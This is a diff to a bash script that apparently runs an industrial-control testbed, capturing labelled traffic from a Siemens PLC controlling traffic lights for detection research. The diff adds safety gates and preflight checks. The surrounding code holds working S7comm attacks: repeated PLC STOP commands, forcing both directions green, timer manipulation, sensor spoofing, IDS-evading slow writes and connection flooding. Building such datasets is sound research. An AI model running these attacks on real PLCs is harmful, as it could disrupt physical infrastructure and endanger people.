@@ -20,9 +20,16 @@ set -euo pipefail
 #
 # Cách chạy:
 #   Máy CONTROLLER: bash run_day.sh --day 1 --role controller \
-#                       --target 192.168.1.10 --iface eth0
+#                       --target 192.168.1.10 --iface "<from tshark -D>"
 #   Máy ATTACKER:   bash run_day.sh --day 3 --role attacker \
-#                       --target 192.168.1.10 --iface eth0
+#                       --target 192.168.1.10 --iface "<from tshark -D>"
+#
+# Pre-run checklist:
+#   1. Set TARGET_IP/RACK/SLOT and CAPTURE_IFACE in testbed.conf.
+#   2. Confirm PLC is powered, reachable, in a lab-safe state, and PUT/GET is enabled.
+#   3. Run: tshark -D
+#   4. Run: bash run_day.sh --day 1 --role attacker --preflight-only --no-capture
+#   5. Confirm Git Bash resolves python/python3 to the environment with python-snap7.
 # ================================================================
 
 [[ -f testbed.conf ]] && source ./testbed.conf
@@ -34,7 +41,15 @@ fi
 DAY=""
 ROLE=""
 TARGET_IP="${TARGET_IP:-192.168.1.10}"
-IFACE="${IFACE:-eth0}"
+RACK="${RACK:-0}"
+SLOT="${SLOT:-1}"
+CAPTURE_IFACE="${CAPTURE_IFACE:-${IFACE:-}}"
+CAPTURE_ENABLED="${CAPTURE_ENABLED:-1}"
+CAPTURE_FILTER="${CAPTURE_FILTER:-}"
+PREFLIGHT_ENABLED="${PREFLIGHT_ENABLED:-1}"
+REQUIRE_PREFLIGHT="${REQUIRE_PREFLIGHT:-1}"
+ENABLE_CPU_CONTROL_ATTACK="${ENABLE_CPU_CONTROL_ATTACK:-0}"
+ALLOW_PA_WRITE_ATTACKS="${ALLOW_PA_WRITE_ATTACKS:-0}"
 SESSION_ID=""
 
 while [[ $# -gt 0 ]]; do
@@ -42,8 +57,15 @@ while [[ $# -gt 0 ]]; do
         --day)        DAY="$2";        shift 2 ;;
         --role)       ROLE="$2";       shift 2 ;;
         --target)     TARGET_IP="$2";  shift 2 ;;
-        --iface)      IFACE="$2";      shift 2 ;;
+        --rack)       RACK="$2";       shift 2 ;;
+        --slot)       SLOT="$2";       shift 2 ;;
+        --iface)      CAPTURE_IFACE="$2"; shift 2 ;;
         --session-id) SESSION_ID="$2"; shift 2 ;;
+        --no-capture) CAPTURE_ENABLED="0"; shift ;;
+        --no-preflight) PREFLIGHT_ENABLED="0"; shift ;;
+        --preflight-only) PREFLIGHT_ONLY="1"; shift ;;
+        --enable-cpu-control) ENABLE_CPU_CONTROL_ATTACK="1"; shift ;;
+        --allow-pa-write-attacks) ALLOW_PA_WRITE_ATTACKS="1"; shift ;;
         *) echo "[ERROR] Unknown: $1"; exit 1 ;;
     esac
 done
@@ -51,6 +73,7 @@ done
 [[ -z "$DAY" ]]  && { echo "Thieu --day (1-6)";  exit 1; }
 [[ -z "$ROLE" ]] && { echo "Thieu --role";        exit 1; }
 [[ -z "$SESSION_ID" ]] && SESSION_ID="day${DAY}_s1"
+[[ -z "$CAPTURE_FILTER" ]] && CAPTURE_FILTER="host $TARGET_IP"
 
 mkdir -p "captures/day${DAY}" logs labels
 
@@ -59,6 +82,13 @@ cleanup() { for p in "${PIDS[@]:-}"; do kill "$p" 2>/dev/null || true; done; }
 trap cleanup EXIT INT TERM
 
 echo "=== run_day.sh  day=$DAY  role=$ROLE  target=$TARGET_IP ==="
+echo "[info] rack=$RACK slot=$SLOT capture=${CAPTURE_ENABLED} iface=${CAPTURE_IFACE:-<empty>}"
+if [[ "$ENABLE_CPU_CONTROL_ATTACK" != "1" ]]; then
+    echo "[info] CPU_STOP disabled by default. Use --enable-cpu-control only if PLC security permits it."
+fi
+if [[ "$ALLOW_PA_WRITE_ATTACKS" != "1" ]]; then
+    echo "[info] PA/Q write attacks disabled by default. Use --allow-pa-write-attacks only in a safe lab."
+fi
 
 # ── Ghi label CSV ────────────────────────────────────────────────
 label() {
@@ -72,6 +102,94 @@ label() {
 
 wait_s() { echo "[wait] $2 -- ${1}s"; sleep "$1"; }
 
+print_tshark_interfaces() {
+    if command -v tshark &>/dev/null; then
+        echo "[capture] Available TShark interfaces:"
+        tshark -D || true
+    else
+        echo "[capture] tshark is not in PATH. Install Wireshark/TShark and reopen Git Bash/terminal."
+    fi
+}
+
+validate_capture_config() {
+    [[ "$CAPTURE_ENABLED" == "1" ]] || return 0
+    if ! command -v tshark &>/dev/null; then
+        echo "[ERROR] CAPTURE_ENABLED=1 but tshark was not found." >&2
+        print_tshark_interfaces >&2
+        exit 2
+    fi
+    if [[ -z "$CAPTURE_IFACE" ]]; then
+        echo "[ERROR] CAPTURE_ENABLED=1 but CAPTURE_IFACE/--iface is empty." >&2
+        echo "[ERROR] Run 'tshark -D' and set CAPTURE_IFACE in testbed.conf or pass --iface." >&2
+        print_tshark_interfaces >&2
+        exit 2
+    fi
+    local ifaces
+    ifaces="$(tshark -D 2>/dev/null || true)"
+    if [[ "$CAPTURE_IFACE" =~ ^[0-9]+$ ]]; then
+        if ! grep -Eq "^[[:space:]]*${CAPTURE_IFACE}\." <<<"$ifaces"; then
+            echo "[ERROR] TShark interface index '$CAPTURE_IFACE' was not found." >&2
+            print_tshark_interfaces >&2
+            exit 2
+        fi
+    elif ! grep -Fq -- "$CAPTURE_IFACE" <<<"$ifaces"; then
+        echo "[ERROR] TShark interface '$CAPTURE_IFACE' was not found." >&2
+        print_tshark_interfaces >&2
+        exit 2
+    fi
+}
+
+start_capture() {
+    local suffix="$1"
+    local pcap="captures/day${DAY}/${SESSION_ID}_${suffix}.pcapng"
+    if [[ "$CAPTURE_ENABLED" != "1" ]]; then
+        echo "[$suffix] capture disabled"
+        return 0
+    fi
+    tshark -n -i "$CAPTURE_IFACE" -f "$CAPTURE_FILTER" -w "$pcap" -q &
+    PIDS+=("$!")
+    echo "[$suffix] tshark -> $pcap"
+}
+
+preflight_plc() {
+    "$PY_CMD" - <<PYEOF
+import sys
+import snap7
+try:
+    from snap7.type import Areas
+except ImportError:
+    from snap7.types import Areas
+
+target = "$TARGET_IP"
+rack = int("$RACK")
+slot = int("$SLOT")
+c = snap7.client.Client()
+try:
+    print(f"[preflight] connect {target} rack={rack} slot={slot}", flush=True)
+    c.connect(target, rack, slot)
+    try:
+        print(f"[preflight] CPU state: {c.get_cpu_state()}", flush=True)
+    except Exception as exc:
+        print(f"[preflight][WARN] cannot read CPU state: {exc}", flush=True)
+    m = c.read_area(Areas.MK, 0, 0, 82)
+    print(f"[preflight] read M area OK ({len(m)} bytes)", flush=True)
+    try:
+        q = c.read_area(Areas.PA, 0, 0, 1)
+        print(f"[preflight] read Q0 OK: 0x{q[0]:02X}", flush=True)
+    except Exception as exc:
+        print(f"[preflight][WARN] read Q0 failed: {exc}", flush=True)
+    c.disconnect()
+    sys.exit(0)
+except Exception as exc:
+    print(f"[preflight][ERROR] Snap7 check failed: {exc}", flush=True)
+    try:
+        c.disconnect()
+    except Exception:
+        pass
+    sys.exit(2)
+PYEOF
+}
+
 # ── Khôi phục PLC về trạng thái an toàn sau tấn công ────────────
 restore_plc() {
     echo "[restore] Khoi phuc PLC..."
@@ -82,12 +200,15 @@ except: from snap7.types import Areas
 from snap7.util import set_bool, set_dint
 try:
     c = snap7.client.Client()
-    c.connect('$TARGET_IP', 0, 1)
+    c.connect('$TARGET_IP', int('$RACK'), int('$SLOT'))
 
     # 1. Neu PLC dang STOP thi hot-start hoac cold-start lai
     try:
         state = c.get_cpu_state()
         if 'Stop' in str(state) or state == 4:
+            if '$ENABLE_CPU_CONTROL_ATTACK' != '1':
+                print('[restore] CPU STOP detected; remote CPU start is disabled. Start CPU manually.')
+                raise RuntimeError('CPU control disabled')
             try:
                 c.plc_hot_start()
                 print('[restore] Sent PLC Hot Start')
@@ -104,8 +225,11 @@ try:
 
     # 2. Reset Q output
     try:
-        c.write_area(Areas.PA, 0, 0, bytearray([0]))
-        print('[restore] Reset Q Output success')
+        if '$ALLOW_PA_WRITE_ATTACKS' == '1':
+            c.write_area(Areas.PA, 0, 0, bytearray([0]))
+            print('[restore] Reset Q Output success')
+        else:
+            print('[restore] Skip Q/PA reset because ALLOW_PA_WRITE_ATTACKS=0')
     except Exception as e_q:
         print(f'[restore] Failed to reset Q output: {e_q}')
 
@@ -149,9 +273,7 @@ PYEOF
 # CONTROLLER — tshark + log_tags + HMI benign
 # ================================================================
 run_controller() {
-    local pcap="captures/day${DAY}/${SESSION_ID}_controller.pcapng"
-    tshark -n -i "$IFACE" -f "host $TARGET_IP" -w "$pcap" -q &
-    PIDS+=("$!"); echo "[ctrl] tshark -> $pcap"
+    start_capture "controller"
 
     $PY_CMD log_tags.py \
         --target "$TARGET_IP" --interval 0.5 \
@@ -167,7 +289,7 @@ c = snap7.client.Client()
 print('[HMI] SCADA polling started', flush=True)
 while True:
     try:
-        if not c.get_connected(): c.connect('$TARGET_IP', 0, 1)
+        if not c.get_connected(): c.connect('$TARGET_IP', int('$RACK'), int('$SLOT'))
         c.read_area(Areas.MK, 0, 0, 82)
         c.read_area(Areas.PA, 0, 0, 1)
         time.sleep(random.uniform(1.0, 2.0))
@@ -184,9 +306,7 @@ while True:
 # ATTACKER — Kill chain thực tế
 # ================================================================
 run_attacker() {
-    local pcap="captures/day${DAY}/${SESSION_ID}_attacker.pcapng"
-    tshark -n -i "$IFACE" -f "host $TARGET_IP" -w "$pcap" -q &
-    PIDS+=("$!"); echo "[att] tshark -> $pcap"
+    start_capture "attacker"
 
     # ── Ngày 1: IDLE ─────────────────────────────────────────────
     if [[ "$DAY" == "1" ]]; then
@@ -233,7 +353,7 @@ import snap7, time
 try:    from snap7.type import Areas
 except: from snap7.types import Areas
 c = snap7.client.Client()
-c.connect('$TARGET_IP', 0, 1)
+c.connect('$TARGET_IP', int('$RACK'), int('$SLOT'))
 
 # Ke tan cong thu thap thong tin PLC truoc
 try:
@@ -248,7 +368,7 @@ except Exception as e:
 n = 0
 while True:
     try:
-        if not c.get_connected(): c.connect('$TARGET_IP', 0, 1)
+        if not c.get_connected(): c.connect('$TARGET_IP', int('$RACK'), int('$SLOT'))
         m = c.read_area(Areas.MK, 0, 0, 82)   # Toan bo M area
         q = c.read_area(Areas.PA, 0, 0, 1)    # Q output
         n += 1
@@ -279,18 +399,19 @@ PYEOF
         # Hậu quả: PLC dừng ngay lập tức → tất cả output về 0 → đèn tắt hết
         # Feature PLC: plc_mode=0 (STOP), Running=0, polling_error tăng
         # Feature network: S7comm PDU type 0x01 (Job) + function 0x29 (PLC STOP)
+        if [[ "$ENABLE_CPU_CONTROL_ATTACK" == "1" ]]; then
         label "CPU_STOP" "START"
         $PY_CMD - <<PYEOF &
 import snap7, time
 try:    from snap7.type import Areas
 except: from snap7.types import Areas
 c = snap7.client.Client()
-c.connect('$TARGET_IP', 0, 1)
+c.connect('$TARGET_IP', int('$RACK'), int('$SLOT'))
 n = 0
 print('[CPU_STOP] Starting periodic PLC STOP attack', flush=True)
 while True:
     try:
-        if not c.get_connected(): c.connect('$TARGET_IP', 0, 1)
+        if not c.get_connected(): c.connect('$TARGET_IP', int('$RACK'), int('$SLOT'))
         # Goi lenh STOP PLC — day la lenh S7comm hop le
         c.plc_stop()
         n += 1
@@ -313,6 +434,9 @@ PYEOF
         kill "$CP" 2>/dev/null || true
         restore_plc
         label "CPU_STOP" "END"
+        else
+            echo "[att] CPU_STOP skipped; pass --enable-cpu-control only if PLC permits remote STOP/START."
+        fi
 
         label "BENIGN_NORMAL" "START"; wait_s 1800 "recovery"; label "BENIGN_NORMAL" "END"
 
@@ -328,13 +452,14 @@ PYEOF
         #
         # Feature PLC: green_conflict=1, q0_raw=0xC2=194, q_output_unexpected=1
         # Feature network: S7 write PDU tới PA area, rate 10/s
+        if [[ "$ALLOW_PA_WRITE_ATTACKS" == "1" ]]; then
         label "RWRITE_BURST" "START"
         $PY_CMD - <<PYEOF &
 import snap7, time
 try:    from snap7.type import Areas
 except: from snap7.types import Areas
 c = snap7.client.Client()
-c.connect('$TARGET_IP', 0, 1)
+c.connect('$TARGET_IP', int('$RACK'), int('$SLOT'))
 # Q0 = Running + Green1 + Green2 = collision state
 # 0b11000010: bit7=Green2, bit6=Green1, bit1=Running
 COLLISION = bytearray([0b11000010])
@@ -342,7 +467,7 @@ n = 0
 print('[RWRITE] Forcing both directions GREEN = COLLISION RISK', flush=True)
 while True:
     try:
-        if not c.get_connected(): c.connect('$TARGET_IP', 0, 1)
+        if not c.get_connected(): c.connect('$TARGET_IP', int('$RACK'), int('$SLOT'))
         c.write_area(Areas.PA, 0, 0, COLLISION)
         n += 1
         if n % 100 == 0:
@@ -355,6 +480,9 @@ PYEOF
         kill "$RP" 2>/dev/null || true
         restore_plc
         label "RWRITE_BURST" "END"
+        else
+            echo "[att] RWRITE_BURST skipped; pass --allow-pa-write-attacks only in a safe lab."
+        fi
 
         label "BENIGN_NORMAL" "START"; wait_s 7200 "cooldown"; label "BENIGN_NORMAL" "END"
 
@@ -385,13 +513,13 @@ try:    from snap7.type import Areas
 except: from snap7.types import Areas
 from snap7.util import set_dint
 c = snap7.client.Client()
-c.connect('$TARGET_IP', 0, 1)
+c.connect('$TARGET_IP', int('$RACK'), int('$SLOT'))
 n = 0
 print('[SETPOINT] Manipulating traffic light timers (Stuxnet-style)', flush=True)
 print('[SETPOINT] TimeG1=TimeG2=1000ms (unsafe), TimeR1=TimeR2=60000ms', flush=True)
 while True:
     try:
-        if not c.get_connected(): c.connect('$TARGET_IP', 0, 1)
+        if not c.get_connected(): c.connect('$TARGET_IP', int('$RACK'), int('$SLOT'))
         m = c.read_area(Areas.MK, 0, 0, 82)
         set_dint(m,  3, 60000)  # TimeR1 = 60s (MD3)  -- do tang len (xe cho lau)
         set_dint(m,  8, 60000)  # TimeR2 = 60s (MD8)
@@ -430,13 +558,13 @@ import snap7, time
 try:    from snap7.type import Areas
 except: from snap7.types import Areas
 c = snap7.client.Client()
-c.connect('$TARGET_IP', 0, 1)
+c.connect('$TARGET_IP', int('$RACK'), int('$SLOT'))
 n = 0
 print('[SPOOF] Fixing all sensor bits = 1 (hiding real traffic state)', flush=True)
 print('[SPOOF] Target: M28 = 0x0F (s1=s4=s2=s3=1)', flush=True)
 while True:
     try:
-        if not c.get_connected(): c.connect('$TARGET_IP', 0, 1)
+        if not c.get_connected(): c.connect('$TARGET_IP', int('$RACK'), int('$SLOT'))
         # M28 = 0x0F = 0b00001111: s1(b0)=s4(b1)=s2(b2)=s3(b3)=1
         c.write_area(Areas.MK, 0, 28, bytearray([0x0F]))
         n += 1
@@ -466,13 +594,13 @@ try:    from snap7.type import Areas
 except: from snap7.types import Areas
 from snap7.util import set_bool
 c = snap7.client.Client()
-c.connect('$TARGET_IP', 0, 1)
+c.connect('$TARGET_IP', int('$RACK'), int('$SLOT'))
 n = 0
 print('[STEALTHY] Low-and-slow: writing STOP bit every 2s', flush=True)
 print('[STEALTHY] Rate: 0.5/s (below typical IDS threshold)', flush=True)
 while True:
     try:
-        if not c.get_connected(): c.connect('$TARGET_IP', 0, 1)
+        if not c.get_connected(): c.connect('$TARGET_IP', int('$RACK'), int('$SLOT'))
         m = c.read_area(Areas.MK, 0, 2, 1)
         set_bool(m, 0, 2, 1)               # M2.2 = STOP = 1
         c.write_area(Areas.MK, 0, 2, m)
@@ -513,7 +641,7 @@ def flood_worker():
     while True:
         try:
             c = snap7.client.Client()
-            c.connect('$TARGET_IP', 0, 1)
+            c.connect('$TARGET_IP', int('$RACK'), int('$SLOT'))
             # Giu ket noi mot chut roi dong (chiem slot)
             time.sleep(0.1)
             c.disconnect()
@@ -637,7 +765,7 @@ import snap7, time
 try:    from snap7.type import Areas
 except: from snap7.types import Areas
 c = snap7.client.Client()
-c.connect('$TARGET_IP', 0, 1)
+c.connect('$TARGET_IP', int('$RACK'), int('$SLOT'))
 try:
     info = c.get_cpu_info()
     print(f'[ENUM] CPU: {info.ModuleTypeName} {info.SZL_ID}', flush=True)
@@ -648,7 +776,7 @@ except Exception as e:
 n = 0
 while True:
     try:
-        if not c.get_connected(): c.connect('$TARGET_IP', 0, 1)
+        if not c.get_connected(): c.connect('$TARGET_IP', int('$RACK'), int('$SLOT'))
         m = c.read_area(Areas.MK, 0, 0, 82)
         q = c.read_area(Areas.PA, 0, 0, 1)
         n += 1
@@ -671,12 +799,12 @@ import snap7, time
 try:    from snap7.type import Areas
 except: from snap7.types import Areas
 c = snap7.client.Client()
-c.connect('$TARGET_IP', 0, 1)
+c.connect('$TARGET_IP', int('$RACK'), int('$SLOT'))
 n = 0
 print('[CPU_STOP] Starting periodic PLC STOP attack', flush=True)
 while True:
     try:
-        if not c.get_connected(): c.connect('$TARGET_IP', 0, 1)
+        if not c.get_connected(): c.connect('$TARGET_IP', int('$RACK'), int('$SLOT'))
         c.plc_stop()
         n += 1
         print(f'[CPU_STOP] #{n}: PLC STOP sent', flush=True)
@@ -695,23 +823,27 @@ PYEOF
         kill "$CP" 2>/dev/null || true
         restore_plc
         label "CPU_STOP" "END"
+        else
+            echo "[att] CPU_STOP skipped; pass --enable-cpu-control only if PLC permits remote STOP/START."
+        fi
 
         label "BENIGN_NORMAL" "START"; wait_s 600 "recovery"; label "BENIGN_NORMAL" "END"
 
         # 4. RWRITE_BURST (20m)
+        if [[ "$ALLOW_PA_WRITE_ATTACKS" == "1" ]]; then
         label "RWRITE_BURST" "START"
         $PY_CMD - <<PYEOF &
 import snap7, time
 try:    from snap7.type import Areas
 except: from snap7.types import Areas
 c = snap7.client.Client()
-c.connect('$TARGET_IP', 0, 1)
+c.connect('$TARGET_IP', int('$RACK'), int('$SLOT'))
 COLLISION = bytearray([0b11000010])
 n = 0
 print('[RWRITE] Forcing both directions GREEN = COLLISION RISK', flush=True)
 while True:
     try:
-        if not c.get_connected(): c.connect('$TARGET_IP', 0, 1)
+        if not c.get_connected(): c.connect('$TARGET_IP', int('$RACK'), int('$SLOT'))
         c.write_area(Areas.PA, 0, 0, COLLISION)
         n += 1
         if n % 100 == 0:
@@ -724,6 +856,9 @@ PYEOF
         kill "$RP" 2>/dev/null || true
         restore_plc
         label "RWRITE_BURST" "END"
+        else
+            echo "[att] RWRITE_BURST skipped; pass --allow-pa-write-attacks only in a safe lab."
+        fi
 
         label "BENIGN_NORMAL" "START"; wait_s 600 "recovery"; label "BENIGN_NORMAL" "END"
 
@@ -735,12 +870,12 @@ try:    from snap7.type import Areas
 except: from snap7.types import Areas
 from snap7.util import set_dint
 c = snap7.client.Client()
-c.connect('$TARGET_IP', 0, 1)
+c.connect('$TARGET_IP', int('$RACK'), int('$SLOT'))
 n = 0
 print('[SETPOINT] Manipulating traffic light timers (Stuxnet-style)', flush=True)
 while True:
     try:
-        if not c.get_connected(): c.connect('$TARGET_IP', 0, 1)
+        if not c.get_connected(): c.connect('$TARGET_IP', int('$RACK'), int('$SLOT'))
         m = c.read_area(Areas.MK, 0, 0, 82)
         set_dint(m,  3, 60000)  # TimeR1 = 60s
         set_dint(m,  8, 60000)  # TimeR2 = 60s
@@ -768,12 +903,12 @@ import snap7, time
 try:    from snap7.type import Areas
 except: from snap7.types import Areas
 c = snap7.client.Client()
-c.connect('$TARGET_IP', 0, 1)
+c.connect('$TARGET_IP', int('$RACK'), int('$SLOT'))
 n = 0
 print('[SPOOF] Fixing all sensor bits = 1 (hiding real traffic state)', flush=True)
 while True:
     try:
-        if not c.get_connected(): c.connect('$TARGET_IP', 0, 1)
+        if not c.get_connected(): c.connect('$TARGET_IP', int('$RACK'), int('$SLOT'))
         c.write_area(Areas.MK, 0, 28, bytearray([0x0F]))
         n += 1
         if n % 100 == 0:
@@ -797,12 +932,12 @@ try:    from snap7.type import Areas
 except: from snap7.types import Areas
 from snap7.util import set_bool
 c = snap7.client.Client()
-c.connect('$TARGET_IP', 0, 1)
+c.connect('$TARGET_IP', int('$RACK'), int('$SLOT'))
 n = 0
 print('[STEALTHY] Low-and-slow: writing STOP bit every 2s', flush=True)
 while True:
     try:
-        if not c.get_connected(): c.connect('$TARGET_IP', 0, 1)
+        if not c.get_connected(): c.connect('$TARGET_IP', int('$RACK'), int('$SLOT'))
         m = c.read_area(Areas.MK, 0, 2, 1)
         set_bool(m, 0, 2, 1)
         c.write_area(Areas.MK, 0, 2, m)
@@ -832,7 +967,7 @@ def flood_worker():
     while True:
         try:
             c = snap7.client.Client()
-            c.connect('$TARGET_IP', 0, 1)
+            c.connect('$TARGET_IP', int('$RACK'), int('$SLOT'))
             time.sleep(0.1)
             c.disconnect()
             with lock:
@@ -916,6 +1051,23 @@ PYEOF
 }
 
 # ================================================================
+validate_capture_config
+
+if [[ "$PREFLIGHT_ENABLED" == "1" ]]; then
+    if ! preflight_plc; then
+        if [[ "$REQUIRE_PREFLIGHT" == "1" ]]; then
+            echo "[ERROR] Preflight failed. Check PLC IP, rack/slot, network, Snap7, and PUT/GET access." >&2
+            exit 2
+        fi
+        echo "[WARN] Preflight failed but REQUIRE_PREFLIGHT=0, continuing." >&2
+    fi
+fi
+
+if [[ "${PREFLIGHT_ONLY:-0}" == "1" ]]; then
+    echo "[preflight] done"
+    exit 0
+fi
+
 case "$ROLE" in
     controller) run_controller ;;
     attacker)   run_attacker   ;;
